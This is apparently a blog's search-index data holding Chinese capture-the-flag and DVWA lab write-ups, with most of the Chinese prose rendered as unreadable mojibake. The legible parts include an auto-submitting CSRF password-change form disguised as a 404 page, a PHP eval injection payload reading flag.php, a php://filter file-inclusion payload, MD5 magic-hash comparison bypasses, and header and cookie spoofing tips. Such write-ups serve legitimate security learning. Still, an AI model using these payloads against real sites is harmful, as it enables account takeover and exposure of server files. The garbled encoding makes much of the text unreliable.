ç”¨äºåµŒå…¥æˆ–å¼•ç”¨å¯æ‰§è¡Œè„šæœ¬ã€‚è¿™é€šå¸¸ç”¨ä½œåµŒå…¥æˆ–è€…æŒ‡å‘ JavaScript ä»£ç ã€‚ æ‰€ä»¥è¿™é¢˜è¦ç»•è¿‡åCSRFæœºåˆ¶ï¼Œå…³é”®æ˜¯è¦è·å–tokenï¼Œè¦åˆ©ç”¨å—å®³è€…çš„cookieå»ä¿®æ”¹å¯†ç çš„é¡µé¢è·å–å…³é”®çš„tokenã€‚æœå¯»äº†ä¸€ä¸‹ç½‘ç»œä¸Šçš„æ–¹æ³•ï¼Œæ•´ç†å¯å¾—:1.ä½¿ç”¨javascriptè„šæœ¬ï¼Œåœ¨æ‰“å¼€æˆ‘ä»¬æ„å»ºçš„å±é™©æ—¶ï¼Œè„šæœ¬ä¼šé€šè¿‡æ¡†æ¶å·å·æ‰“å¼€ä¿®æ”¹å¯†ç çš„é¡µé¢ï¼Œè·å–å…¶ä¸­çš„tokenï¼Œç„¶åè¿›è¡Œæ”¹å¯†æ“ä½œä½†æ˜¯ç”±äºæ¶‰åŠè·¨åŸŸçš„æ“ä½œï¼Œæ‰€ä»¥è¿™ä¸ªæ“ä½œä¹Ÿæ˜¯ä¸è¡Œæ»´ï¼› 2.åˆ©ç”¨XSSæ¼æ´ï¼šXSSè¿˜æ²¡å­¦ï¼Œç­‰æˆ‘å­¦äº†å†æ¥è¡¥å……å§ã€‚ã€‚ã€‚ æ‹“å±•å¼•è¯­ï¼šä»»ä½•çš„webè„šæœ¬è¯­è¨€éƒ½å¯ä»¥é€‰æ‹©ä»¥ä½•ç§è¯·æ±‚æ¥æ¥å—æ•°æ®ï¼Œæœ‰$_GET $_POST $_REQUEST. getå‹ï¼šDVWAä¸­ï¼Œ 12$pass_new = $_GET[ 'password_new' ];$pass_conf = $_GET[ 'password_conf' ]; è¿™é‡Œçš„æ•°æ®å°±æ˜¯getç±»å‹çš„ï¼Œæ‰€ä»¥htmlé¡µé¢çš„æ„å»ºï¼Œåƒä¸Šé¢ä¸€æ ·å³å¯ POSTå‹å¦‚ä½•æ„å»ºç½‘é¡µå‘¢ï¼Ÿ 12345678910111213&lt;form action=&quot;http://127.0.0.1:81/DVWA-master/vulnerabilities/csrf/&quot; method=POST&gt;&lt;input type=&quot;hidden&quot; name=&quot;password_new&quot; value=&quot;hacker1&quot;/&gt;&lt;input type=&quot;hidden&quot; name=&quot;password_conf&quot; value=&quot;hacker1&quot;/&gt;&lt;input type=&quot;submit&quot; value=&quot;Change&quot; name=&quot;Change&quot;/&gt;&lt;/form&gt;&lt;body&gt;&lt;h1&gt;404&lt;h1&gt;&lt;h2&gt;file not found&lt;h2&gt;&lt;/body&gt;&lt;script&gt;document.forms[0]sumit();//è¿™é‡Œæ˜¯ç”¨äº†ä¸€ä¸ªè‡ªåŠ¨æäº¤çš„è„šæœ¬&lt;/script&gt; ä½¿ç”¨burpsuitè¿›è¡Œæ‰«æ:","link":"/2021/01/22/CSRF/"},{"title":"bugku1&amp;æ”»é˜²ä¸–ç•Œ","text":"web8 å°±ç»™äº†ä¸ªè¿™ä¸ª å•¥ä¹Ÿæ— ï¼Œæ‰€ä»¥å°±è¦æƒ³è¯¥å¦‚ä½•è·å¾—flag, æˆ‘ä»¬çœ‹åˆ° $_REQUEST()å‡½æ•° ä»–æ—¢å¯ä»¥æ¥å—getä¹Ÿå¯ä»¥æ¥æ”¶postæ•°æ®ï¼Œæ‰€ä»¥ åœ¨è¿™é‡Œï¼Œä»–çš„æ„æ€æ˜¯è·å¾—ä¸€ä¸ªhelloçš„æ•°æ®ï¼Œæ‰€ä»¥æˆ‘ä»¬å°±éœ€è¦æ‰€ä»¥ æˆ‘ä»¬åœ¨URLé‡Œé¢è¾“å…¥çš„æ—¶å€™å°±éœ€è¦è¾“å…¥?hello=å¤šå°‘ ç„¶åè¿™ä¸ªå¤šå°‘ä¼šè¢«ä»£å…¥åˆ°evalé‡Œé¢æ‰§è¡Œè€Œæˆ‘ä»¬å¯¹evalè¿™ä¸ªå‡½æ•°ä¹Ÿä¸é™Œç”Ÿäº†ï¼Œä»–æ˜¯å°†ä½ è¾“å…¥çš„å­—ç¬¦ä¸²è½¬åŒ–ä¸ºPHPä»£ç æ¥æ‰§è¡Œï¼Œä½†æ˜¯ä¸¤æ®µå‘½ä»¤ä¹‹é—´éœ€è¦ç”¨åˆ†å·æ¥éš”å¼€ï¼Œè€Œåœ¨è¿™é¢˜ä¸­ï¼Œä»–çš„flagä¼¼ä¹æ˜¯åŒ…å«åœ¨flag.phpçš„æ–‡ä»¶å¤¹ä¸­çš„ï¼Œè¦è·å–flagå°±éœ€è¦è¾“å‡ºè¿™ä¸ªæ–‡ä»¶å¤¹çš„å†…å®¹ï¼šæ„å»ºpayloadï¼šhttp://114.67.246.176:10770/?hello=1);print_r(file(&quot;./flag.php&quot;)ä¸ºä»€ä¹ˆå¯ä»¥ä½¿ç”¨print_rå’Œvar_dumpè€Œä¸ä½¿ç”¨echoå‘¢ï¼ŸåŸå› ï¼šå‰ä¸¤ä¸ªè¿˜å¯ä»¥è¾“å‡ºå¤æ‚çš„æ•°ç»„ç±»å‹ è€Œechoä»…èƒ½è¾“å‡ºå˜é‡æˆ–å­—ç¬¦ä¸² 12.18æ—¥çœ‹å®Œé»‘ç›¾è¢«èµ›å‰åŸ¹è®­æ€è€ƒï¼š web9 åœ¨è¿™é¢˜å½“ä¸­ï¼Œæˆ‘ä»¬çœ‹äº†ä¸€ä¸‹ä»£ç  é¦–å…ˆç”¨äº†ä¸€ä¸ªæ­£åˆ™è¡¨è¾¾å¼ï¼Œæ„æ€æ˜¯å¦‚æœåœ¨æäº¤ä¸Šæ¥çš„å€¼ä¸­åŒ…å«ä¸æ˜¯å­—æ¯æˆ–è€…æ•°å­—çš„ä¸œè¥¿ï¼Œå°†ä¼šè¢«args errorï¼Œé‚£ä¹ˆæˆ‘ä»¬åœ¨çœ‹ä¸‹é¢ èµ„æ–™æ¥æºï¼šhttps://blog.csdn.net/anjiaowangmenghan/article/details/76460872 æ‰€ä»¥æˆ‘ä»¬å¯ä»¥çŸ¥é“å½“æœ‰ä¸¤ä¸ª$$çš„æ—¶å€™ ç¬¬ä¸€ä¸ªæ˜¯ä¸º$args å‡è®¾æˆ‘ä»¬è®©$args=as é‚£ä¹ˆæœ€ç»ˆå°±ä¼šå˜æˆ $as é‚£ä¹ˆå°±ä¼šæ‰§è¡Œ$**è¿™ä¸ªå˜é‡æ‰€è¡¨ç¤ºçš„å€¼ï¼Œé‚£ä¹ˆå†æœ¬é¢˜ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥å°±å¯ä»¥åˆ©ç”¨è¿™ç‚¹ï¼Œè®©ä»–æ‰§è¡Œä¸€ä¸ªå…¨å±€æ•°ç»„å˜é‡ï¼Œä¹Ÿå°±æ˜¯$GLOBALS $GLOBALS **â€” å¼•ç”¨å…¨å±€ä½œç”¨åŸŸä¸­å¯ç”¨çš„å…¨éƒ¨å˜é‡**è¯´æ˜ä¸€ä¸ªåŒ…å«äº†å…¨éƒ¨å˜é‡çš„å…¨å±€ç»„åˆæ•°ç»„ã€‚å˜é‡çš„åå­—å°±æ˜¯æ•°ç»„çš„é”®ã€‚æ³¨æ„: å˜é‡å¯ç”¨æ€§ä¸æ‰€æœ‰å…¶ä»–è¶…å…¨å±€å˜é‡ä¸åŒï¼Œ$GLOBALSåœ¨PHPä¸­æ€»æ˜¯å¯ç”¨çš„ã€‚æ‰€ä»¥å½“æˆ‘ä»¬è°ƒç”¨$GLOBALSçš„æ—¶å€™ï¼Œè¾“å‡ºçš„å°†ä¼šæ˜¯æ‰€æœ‰æ•°ç»„æ„å»ºpayloadï¼šhttp://114.67.246.176:11872/?args=GLOBALS å¥½çš„è¿™æ ·å°±è¡Œäº† web11æ˜¯å¦ç•™ä¸‹åé—¨ï¼Ÿè¦çœ‹æ˜¯å¦ç•™ä¸‹åé—¨æˆ‘ä»¬è¦ä»å“ªé‡Œçªç ´ï¼Ÿæ ¹æ®é‚£ä¸ªæ•™å­¦è§†é¢‘ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹çœ‹è¿™ä¸ªç½‘ç«™çš„ç½‘ç«™ç›®å½•çœ‹çœ‹æœ‰æ²¡æœ‰å…¶ä»–ç›®å½•ï¼Œè¿™ä¸ªæ—¶å€™æˆ‘ä»¬å°±ä½¿ç”¨åˆ°ä¸€ä¸ªå«åšå¾¡å‰‘çš„è½¯ä»¶ï¼Œæ˜¯ä¸€ä¸ªåå°ç½‘ç«™çˆ†ç ´çš„è½¯ä»¶å¯ä»¥çœ‹åˆ° å®ƒæ˜¯ç”±ä¸€ä¸ªshell.phpçš„ç½‘ç«™çš„ï¼Œé‚£ä¹ˆè¿™ä¸ªæ—¶å€™æˆ‘ä»¬æ‰“å¼€ä¸€ä¸‹è¿™ä¸ªshell.phpè¯•è¯• ä»–éœ€è¦æˆ‘ä»¬è¾“å…¥PASS è¿™ä¸ªæ—¶å€™æˆ‘ä»¬å¯ä»¥ç›´æ¥ç”¨burp suitè¿›è¡Œæš´åŠ›ç ´è§£å³å¯PS:index.php ä¸»ä½“ç½‘ç«™ web12åœ¨æŸ¥çœ‹ç½‘é¡µæºä»£ç çš„æ—¶å€™å‘ç°äº†è¿™ä¸ª ä¸€ä¸ªå¥½åƒæ˜¯ç»è¿‡åŠ å¯†çš„ä¸œè¥¿ ç„¶åæˆ‘å°±å»è§£ç ï¼Œå‘ç°æ˜¯base64çš„ç¼–ç ï¼Œç„¶åè§£ç å®Œåæ˜¯test123 ç„¶åå†çœ‹ç½‘é¡µæ˜¯éœ€è¦æˆ‘ä»¬è¾“å…¥ç®¡ç†å‘˜çš„è´¦å·å’Œå¯†ç çš„ï¼Œç„¶åæˆ‘ä»¬ç›²çŒœä¸€æ³¢è´¦å·æ˜¯admin å¯†ç æ˜¯è¿™ä¸ªè¯•è¯• ä½†æ˜¯ä»–ä¸€ç›´è¯´IPç¦æ­¢è®¿é—®ï¼Œç„¶åæŸ¥äº†ä¸€ä¸‹èµ„æ–™è¯´æ˜¯è¦ç”¨ä¼ªé€ ä¸€ä¸ªXFFè¿›è¡Œç™»å½•å¤§æ¦‚æ˜¯è¿™æ ·çš„é—®é¢˜1ï¼šXFFæ˜¯ä»€ä¹ˆï¼ŸXFFæ˜¯headerè¯·æ±‚å¤´ä¸­çš„ä¸€ä¸ªå‚æ•° æ˜¯ç”¨æ¥è¯†åˆ«é€šè¿‡HTTPä»£ç†æˆ–è´Ÿè½½å‡è¡¡æ–¹å¼è¿æ¥åˆ°WebæœåŠ¡å™¨çš„å®¢æˆ·ç«¯æœ€åŸå§‹çš„IPåœ°å€çš„HTTPè¯·æ±‚å¤´å­—æ®µã€‚ ä»£è¡¨äº†HTTPçš„è¯·æ±‚ç«¯çœŸå®çš„IPã€‚ é—®é¢˜2ï¼šä¸ºä»€ä¹ˆçœ‹åˆ°IPè¢«ç¦æ­¢å¯ä»¥æƒ³åˆ°ä¼ªé€ XFFï¼ŸIPè¢«ç¦æ­¢äº†ï¼Œæˆ‘ä»¬æƒ³è¦ç»§ç»­è®¿é—®ï¼Œå¯ä»¥é€šè¿‡ä¼ªé€ XFFæ¥ç»•è¿‡æœåŠ¡å™¨ipçš„è¿‡æ»¤è¿›è¡Œè®¿é—® web13æ­£å¸¸ç”¨LFIå»è¯»/sqli/db.phpæ–‡ä»¶ æ˜¯æ— æ³•è¯»å–å®ƒçš„æºç  å®ƒä¼šè¢«å½“åšphpæ–‡ä»¶è¢«æ‰§è¡Œ å°†åªä¼šè¾“å‡ºç»“æœ è¿™ä¸ªæ—¶å€™æˆ‘ä»¬å°±å¯ä»¥ä½¿ç”¨php://filteræ„é€ payload:?file=php://filter/read=convert.base64-encode/resource=index.php php://filteråœ¨PHPå®˜ç½‘ä¸Šçš„è§£é‡Šæ˜¯ï¼šå®ƒæ˜¯ä¸€ç§å…ƒå°è£…å™¨ï¼Œè®¾è®¡ç”¨äºæ•°æ®æµæ‰“å¼€æ—¶çš„ç­›é€‰è¿‡æ»¤åº”ç”¨ã€‚è¿™å¯¹äºä¸€ä½“å¼çš„æ–‡ä»¶å‡½æ•°éå¸¸æœ‰ç”¨ï¼Œç±»ä¼¼readfile()ã€file()å’Œfile_get_contents()ï¼Œåœ¨æ•°æ®æµå†…å®¹è¯»å–ä¹‹å‰æ²¡æœ‰æœºä¼šåº”ç”¨å…¶ä»–è¿‡æ»¤å™¨php://filterç›®æ ‡ä½¿ç”¨ä»¥ä¸‹çš„å‚æ•°ä½œä¸ºå®ƒè·¯å¾„çš„ä¸€éƒ¨åˆ†ã€‚å¤åˆè¿‡æ»¤é“¾èƒ½å¤Ÿåœ¨ä¸€ä¸ªè·¯å¾„ä¸ŠæŒ‡å®šã€‚ ç­›é€‰è¿‡æ»¤åº”ç”¨ï¼š 1ã€ å­—ç¬¦ä¸²è¿‡æ»¤å™¨ï¼š string.rot13 å¯¹å­—ç¬¦ä¸²æ‰§è¡ŒROT13è½¬æ¢ string.toupperè½¬æ¢ä¸ºå¤§å†™ string.tolower è½¬æ¢ä¸ºå°å†™ string.strip_tagså»é™¤htmlå’Œphpæ ‡è®° 2ã€ è½¬æ¢è¿‡æ»¤å™¨ï¼š convert.base64-encode &amp; convert.base64-decode ï¼š**base64ç¼–ç å’Œè§£ç ** convert.quoted-printable-encode &amp; convert.quoted-printable-decode**ï¼š**å°† quoted-printable å­—ç¬¦ä¸²è½¬æ¢ä¸º 8-bit å­—ç¬¦ä¸² 3ã€ å‹ç¼©è¿‡æ»¤å™¨ï¼š zlib.deflate**å’Œ** zlib.inflate bzip2.compress**å’Œ** bzip2.decompress 4ã€ åŠ å¯†è¿‡æ»¤å™¨ï¼š mcrypt.tripledeså’Œmdecrypt.tripledesç­‰èµ„æ–™æ¥æºï¼šhttps://www.cnblogs.com/natian-ws/p/7242477.html web16ini_set()å‡½æ•°ï¼š ä¸æ˜¾ç¤ºæŠ¥é”™ä¿¡æ¯strstr()å‡½æ•°ï¼šstrstr(string,search,before_search)èµ„æ–™æ¥æºï¼šhttps://www.runoob.com/php/func-string-strstr.htmlæ‰€ä»¥æˆ‘ä»¬å¯ä»¥çŸ¥é“ è¿™å¥è¯çš„æ„æ€æ˜¯ ä»æäº¤ä¸Šæ¥çš„urlå­—ç¬¦ä¸²ä¸­æœç´¢ï¼Œ æœç´¢ï¼Ÿä»¥åçš„å†…å®¹ï¼Œæ‰€ä»¥$str=?=â€¦.. substr()å‡½æ•°è¿™ä¸ªå‡½æ•°æˆ‘ä»¬ä¹‹å‰å·²ç»é‡åˆ°è¿‡äº†ï¼Œä½†æ˜¯ä¸Šä¸€æ¬¡æ²¡æœ‰å­¦æ¸…æ¥šæˆ‘è§‰å¾— è¯­æ³•ï¼šsubstr(string,start,length)æ‰€ä»¥è¯´ åœ¨è¿™å¥è¯ä¸­å®ƒçš„æ„æ€æ˜¯è¿”å›ä»ç¬¬ä¸€ä¸ªå­—ç¬¦å¼€å§‹å¾€åçš„å†…å®¹æ‰€ä»¥æˆ‘ä»¬æœ€åè¿™ä¸ªsubstr==ã€‚ã€‚ã€‚ã€‚ã€‚ç„¶åæ˜¯ srt_replaceå°±æ˜¯ä¸€ä¸ªæ­£åˆ™æ›¿æ¢å§ ä»–çš„æ„æ€æ˜¯å§keyæ¢æˆæ— å€¼**parse_str()**å‡½æ•°è¯­æ³•ï¼šparse_str(string,array)â€™//åé¢çš„arrayå¯ä¸é€‰ï¼Œé€‰äº†ä»¥åæ„æ€æ˜¯å°†stringä¸­çš„å­—ç¬¦ä¸²æ•°ç»„å˜é‡å­˜å‚¨åˆ°å®šä¹‰çš„arrayè¿™ä¸ªæ•°ç»„å½“ä¸­ä»–çš„ä½œç”¨æ˜¯å°†æŸ¥è¯¢å­—ç¬¦ä¸²è§£æåˆ°å˜é‡ä¸­ä¸¾ä¸ªä¾‹å­å§parse_str(â€œname=hh&amp;age=18â€);echo $name;echo $age; è¿™æ ·çš„ç»“æœæ˜¯ hh å’Œ18ï¼› é‚£ä¹ˆè¿™é¢˜ç©¶ç«Ÿä»€ä¹ˆæ„æ€å‘¢ï¼Ÿ 1234567echo md5($key1);echo md5($key2);if(md5($key1) == md5($key2) &amp;&amp; $key1 !== $key2){ echo $flag.&quot;å–å¾—flag&quot;;}?&gt; ä»–çš„æ„æ€å°±æ˜¯ æˆ‘è¾“å…¥ä¸¤ä¸ªkey åœ¨ç»è¿‡å»æ‰é—®å·å»æ‰keyä»¥å å¦‚æœä¸¤ä¸ªçš„md5å€¼ç›¸ç­‰ï¼Œä½†æ˜¯ä¸¤ä¸ªkeyæœ¬èº«ä¸ç›¸ç­‰é‚£å°±è¾“å‡ºflagæ‰€ä»¥æˆ‘éœ€è¦æ‰¾ä¸¤ä¸ªMD5å€¼ç›¸ç­‰çš„å­—ç¬¦ä¸²ï¼šæ€è·¯1.å¦‚æœä¸¤ä¸ªå­—ç¬¦ç»MD5åŠ å¯†åçš„å€¼ä¸º 0exxxxxå½¢å¼ï¼Œå°±ä¼šè¢«è®¤ä¸ºæ˜¯ç§‘å­¦è®¡æ•°æ³•ï¼Œä¸”è¡¨ç¤ºçš„æ˜¯0*10çš„xxxxæ¬¡æ–¹ï¼Œè¿˜æ˜¯é›¶ï¼Œéƒ½æ˜¯ç›¸ç­‰çš„ã€‚ï¼ˆä¹Ÿå°±æ˜¯æˆ‘ä½¿ç”¨çš„æ–¹æ³•ï¼‰ ä¸‹åˆ—çš„å­—ç¬¦ä¸²çš„MD5å€¼éƒ½æ˜¯0eå¼€å¤´çš„ï¼š QNKCDZO 240610708 s878926199a s155964671a s214587387a s214587387aindex.php?kekeyy1=QNKCDZO&amp;kekeyy2=240610708 2.md5()å‡½æ•°æ— æ³•å¤„ç†æ•°ç»„ï¼Œå¦‚æœä¼ å…¥çš„ä¸ºæ•°ç»„ï¼Œä¼šè¿”å›NULLï¼Œæ‰€ä»¥ä¸¤ä¸ªæ•°ç»„ç»è¿‡åŠ å¯†åå¾—åˆ°çš„éƒ½æ˜¯NULL,ä¹Ÿå°±æ˜¯ç›¸ç­‰çš„ã€‚ æ‰€ä»¥å¯ä»¥è¾“å…¥ï¼šhttp://120.24.86.145:8002/web16/index.php?kekeyy1[]=something&amp;kekeyy2[]=anythingèµ„æ–™æ¥æºï¼šhttps://www.cnblogs.com/yuluoluo/p/9782327.html web-php-includeæ–‡ä»¶åŒ…å«æ¼æ´æ–‡ä»¶åŒ…å«ç®€ä»‹ï¼šæœåŠ¡å™¨æ‰§è¡ŒPHPä»£ç çš„æ—¶å€™ï¼Œå¯ä»¥é€šè¿‡æ–‡ä»¶åŒ…å«å‡½æ•°åŠ è½½å¦ä¸€ä¸ªæ–‡ä»¶å¤¹ä¸­çš„PHPä»£ç ï¼Œå¹¶ä¸”å½“PHPæ¥æ‰§è¡Œï¼Œè¿™æ„å‘³ç€æ‚¨å¯ä»¥åˆ›å»ºä¾›æ‰€æœ‰ç½‘é¡µå¼•ç”¨çš„æ ‡å‡†é¡µçœ‰æˆ–èœå•æ–‡ä»¶ã€‚å½“é¡µçœ‰éœ€è¦æ›´æ–°æ—¶ï¼Œæ‚¨åªæ›´æ–°ä¸€ä¸ªåŒ…å«æ–‡ä»¶å°±å¯ä»¥äº†ï¼Œæˆ–è€…å½“æ‚¨å‘ç½‘ç«™æ·»åŠ ä¸€å¼ æ–°é¡µé¢æ—¶ï¼Œä»…ä»…éœ€è¦ä¿®æ”¹ä¸€ä¸‹èœå•æ–‡ä»¶ï¼ˆè€Œä¸æ˜¯æ›´æ–°æ‰€æœ‰ç½‘é¡µä¸­çš„é“¾æ¥ï¼‰ã€‚æ–‡ä»¶åŒ…å«å‡½æ•°require()require_once()include()include_once() include å’ŒrequireåŒºåˆ«ä¸»è¦æ˜¯ï¼Œincludeåœ¨åŒ…å«çš„è¿‡ç¨‹ä¸­å¦‚æœå‡ºç°é”™è¯¯ï¼Œä¼šæŠ›å‡ºä¸€ä¸ªè­¦å‘Šï¼Œç¨‹åºç»§ç»­æ­£å¸¸è¿è¡Œï¼›è€Œrequireå‡½æ•°å‡ºç°é”™è¯¯çš„æ—¶å€™ï¼Œä¼šç›´æ¥æŠ¥é”™å¹¶é€€å‡ºç¨‹åºçš„æ‰§è¡Œã€‚è€Œinclude_once()ï¼Œrequire_once()è¿™ä¸¤ä¸ªå‡½æ•°ï¼Œä¸å‰ä¸¤ä¸ªçš„ä¸åŒä¹‹å¤„åœ¨äºè¿™ä¸¤ä¸ªå‡½æ•°åªåŒ…å«ä¸€æ¬¡ï¼Œé€‚ç”¨äºåœ¨è„šæœ¬æ‰§è¡ŒæœŸé—´åŒä¸€ä¸ªæ–‡ä»¶æœ‰å¯èƒ½è¢«åŒ…æ‹¬è¶…è¿‡ä¸€æ¬¡çš„æƒ…å†µä¸‹ï¼Œä½ æƒ³ç¡®ä¿å®ƒåªè¢«åŒ…æ‹¬ä¸€æ¬¡ä»¥é¿å…å‡½æ•°é‡å®šä¹‰ï¼Œå˜é‡é‡æ–°èµ‹å€¼ç­‰é—®é¢˜ã€‚ æ¼æ´äº§ç”ŸåŸå› ï¼šæ–‡ä»¶åŒ…å«å‡½æ•°åŠ è½½çš„å‚æ•°æ²¡æœ‰ç»è¿‡è¿‡æ»¤æˆ–è€…ä¸¥æ ¼çš„å®šä¹‰ï¼Œå¯ä»¥è¢«ç”¨æˆ·æ§åˆ¶ï¼ŒåŒ…å«å…¶ä»–æ¶æ„æ–‡ä»¶ï¼Œå¯¼è‡´äº†æ‰§è¡Œäº†éé¢„æœŸçš„ä»£ç ã€‚ 1234&lt;?php $filename = $_GET['filename']; include($filename); ?&gt; ä¾‹å¦‚ï¼š$_GET['filename']å‚æ•°å¼€å‘è€…æ²¡æœ‰ç»è¿‡ä¸¥æ ¼çš„è¿‡æ»¤ï¼Œç›´æ¥å¸¦å…¥äº†includeçš„å‡½æ•°ï¼Œæ”»å‡»è€…å¯ä»¥ä¿®æ”¹$_GET['filename']çš„å€¼ï¼Œæ‰§è¡Œéé¢„æœŸçš„æ“ä½œã€‚ æ¼æ´åˆ†ç±»ï¼š æœ¬åœ°æ–‡ä»¶åŒ…å«æ¼æ´1.æ— é™åˆ¶æœ¬åœ°æ–‡ä»¶åŒ…å«æ¼æ´2.sessionæ–‡ä»¶åŒ…å«æ¼æ´3.æœ‰é™åˆ¶æœ¬åœ°æ–‡ä»¶åŒ…å«æ¼æ´ç»•è¿‡ è¿œç¨‹æ–‡ä»¶åŒ…å«æ¼æ´1.æ— é™åˆ¶è¿œç¨‹æ–‡ä»¶åŒ…å«æ¼æ´2æœ‰é™åˆ¶è¿œç¨‹æ–‡ä»¶åŒ…å«æ¼æ´ç»•è¿‡3.é—®å·äº•å·ç»•è¿‡ å‚è€ƒèµ„æ–™ï¼šhttps://www.freebuf.com/news/182280.html åˆ†ææºç ï¼šshow sourceï¼ˆï¼‰å±•ç¤ºæ–‡ä»¶ï¼Œæ–‡æœ¬ä¸­é«˜äº®çš„éƒ¨åˆ†includeï¼ˆï¼‰ï¼ŒåŠ è½½$pageè¿™ä¸ªå˜é‡å½“ä¸­æ‰€æŒ‡å‘çš„æ–‡ä»¶å¤¹ä¸­çš„ä»£ç str_replaceï¼šæ­£åˆ™æ›¿æ¢ï¼Œè¿‡æ»¤æ‰phpï¼š//strstr()ï¼šå‰é¢é‡è¿‡ï¼Œå°±æ˜¯æœç´ æ‰€ä»¥ä»£ç æ˜¯è¿™æ ·çš„ï¼Œè¾“å‡ºçš„æ˜¯helloå‚æ•°ï¼Œè€Œè¢«åŠ è½½æ–‡ä»¶æ–‡æœ¬ä»£ç çš„æ˜¯$pageå˜é‡ä¸­çš„å†…å®¹æ€è·¯ï¼šæˆ‘ä»¬çš„æ€è·¯æ˜¯ï¼Œè®©$pageæ‰€å¾—åˆ°çš„å†…å®¹ç»ç”±helloæ˜¾ç¤ºå‡ºæ¥ åœ¨çœ‹é»‘ç›¾æ¯çš„æ•™å­¦è§†é¢‘ä¸­å®åœ¨ä¸æ‡‚ä¸ºå•¥å¯ä»¥?page=http://127.0.0.1/index.php/?hello=æ‰€ä»¥å°±å…ˆè·³è¿‡è¿™ä¸ªæ–¹æ³•å§ã€‚æ–¹æ³•ä¸€ï¼šä½¿ç”¨php://inputå°è£…åè®®æ„Ÿè§‰è¿™ä¸ªæ€æƒ³æŒºå·§å¦™çš„ï¼Œè¿™ä¸ªphp://inputå¯ä»¥è®©pageè¯»å–æˆ‘ä»¬ç”¨postä¸Šä¼ çš„æ–‡ä»¶ï¼ˆæˆ‘ä»¬å†™ä¸€æ®µå®Œæ•´ä»£ç ä¹Ÿæ˜¯ä¸€ä¸ªæ–‡ä»¶ç„¶åå› ä¸ºè¿™è¾¹æœ‰è¿‡æ»¤ï¼Œæ‰€ä»¥æˆ‘ä»¬å°±å¯ä»¥ä½¿ç”¨é‚£å‡ é’Ÿç»•è¿‡æ–¹å¼è¿™è¾¹ä½¿ç”¨å¤§å°å†™ç»•è¿‡ï¼šæˆ‘æ— è¯­äº† ç²˜è´´å¤åˆ¶ç”»é¢éƒ½æ— ååº”æ„Ÿè§‰å¾ˆå¤šä»£ç éƒ½æ²¡é™Œç”Ÿï¼Œæˆ‘è®¤ä¸ºè¿˜æ˜¯ç»§ç»­å»åˆ·upload-labså§ï¼Œåé¢å¤šå­¦ç‚¹å†æ¥è¡¥å……å§ web20:æ‰“å¼€ç½‘é¡µï¼Œæ˜¯ä¸€ä¸²å­—æ¯ï¼Œçœ‹ç€ä¸åƒè¢«åŠ å¯†è¿‡çš„å†çœ‹çœ‹URL 1?line=&amp;filename=a2V5cy50eHQ= a2V5cy50eHQ=åƒæ˜¯è¢«base64åŠ å¯†è¿‡å¾—è§£ç åå¾—ï¼škeys.txtç”¨å¾¡å‰‘æ‰«æåå°å‘ç°æœ‰keys.txt æ¨æµ‹å¯å¾—ï¼Œç½‘é¡µå­˜åœ¨æ–‡ä»¶åŒ…å«æ¼æ´ ?lineä»£è¡¨çš„æ˜¯è¡Œæ•° é»˜è®¤æ˜¯ç¬¬ä¸€è¡Œ åé¢çš„filenameæ˜¯æ–‡ä»¶åï¼Œæ¥ä¸‹æ¥å°±æ˜¯å°è¯•äº†: è¯»å–ä¸€ä¸‹index.phpæ–‡ä»¶è¯•è¯•ï¼Œå…ˆå°†å…¶ç”¨base64è¿›è¡Œç¼–ç ï¼Œç„¶åè¾“å…¥åˆ°urlä¸­ï¼Œåœ¨ä¸€è¡Œè¡ŒæŸ¥çœ‹ä»£ç ä¸­ï¼Œæˆ‘ä»¬å‘ç°åœ¨åé¢æœ‰è¯´ä¸€ä¸ª 1if(isset($_COOKIE['margin']) &amp;&amp; $_COOKIE['margin']=='margin') ï¼Œå°±å¯ä»¥çœ‹keys.phpï¼Œé‚£ä¹ˆè®©æˆ‘ä»¬ä¼ªé€ è¯•è¯• å¥½çš„æˆåŠŸ web21æŸ¥çœ‹ç½‘é¡µæºç ï¼Œæ„Ÿè§‰æ²¡å•¥ï¼Œç„¶ååªèƒ½çœ‹çœ‹æœ‰ä»€ä¹ˆä¿¡æ¯èƒ½åˆ©ç”¨ï¼Œä½¿ç”¨å¾¡å‰‘ï¼Œçœ‹çœ‹æœ‰æ²¡æœ‰å…¶ä»–åå°ï¼Œå‘ç°æ²¡æœ‰æ”¶è·ï¼Œçœ‹äº†ä¸‹é¢˜è§£ï¼Œç½‘é¡µæºç æœ‰ä¸€ä¸ª1p.htmlï¼Œç›´æ¥è®¿é—®ï¼Œå‘ç°ä¼šè·³è½¬ï¼Œå¯ä»¥æ¨æµ‹å‡ºå…¶æºç æœ‰hrefå±æ€§ï¼Œç„¶åç›´æ¥view-source:http://114.67.246.176:16013/1p.htmlï¼Œä½¿ç”¨view-sourceå‰ç¼€å³å¯ç›´æ¥æŸ¥çœ‹ç½‘é¡µæºç ï¼Œå‘ç°scriptä½¿ç”¨äº†urlcodeï¼Œç»è¿‡è§£ç ï¼Œæ˜¯ 1&lt;script&gt; href=&quot;URL&quot;&lt;/script&gt; å†çœ‹åé¢ï¼Œåˆæ˜¯base64åŠ å¯†ï¼Œè§£ç ä»¥åå¾—åˆ°urlcodeåŠ å¯†ï¼Œç„¶åå†è§£ç : 1234567891011121314151617181920212223if(!$_GET['id']){ header('Location: hello.php?id=1'); exit();}$id=$_GET['id'];$a=$_GET['a'];$b=$_GET['b'];if(stripos($a,'.')){ echo 'no no no no no no no'; return ;}$data = @file_get_contents($a,'r');if($data==&quot;bugku is a nice plateform!&quot; and $id==0 and strlen($b)&gt;5 and eregi(&quot;111&quot;.substr($b,0,1),&quot;1114&quot;) and substr($b,0,1)!=4){ $flag = &quot;flag{***********}&quot;}else{ print &quot;never never never give up !!!&quot;;}?&gt; å¾—åˆ°ä»¥ä¸Šä»£ç ï¼Œè®©æˆ‘ä»¬åº·åº·è¿™æ®µä»£ç å†™äº†å•¥ çœ‹çœ‹ä»–è¿™å‡ ä¸ªåˆ¤æ–­ï¼Œé¦–å…ˆæ˜¯idä¸ºç©ºåˆ™ç›´æ¥è·³è½¬ä¸€ä¸‹è¿æ¥ï¼Œéç©ºåˆ™ä¸æ‰§è¡Œæ¥ä¸‹æ¥å¥¹ä¼šgetè·å–id a b ä¸‰ä¸ªå˜é‡çš„å€¼ï¼Œå¦‚æœaå½“ä¸­æœ‰â€˜.â€™é‚£ä¹ˆå°†ä¼šç›´æ¥æ‰§è¡Œé‚£ä¸ªåˆ¤æ–­è¯­å¥ï¼Œ file_get_contents â€” 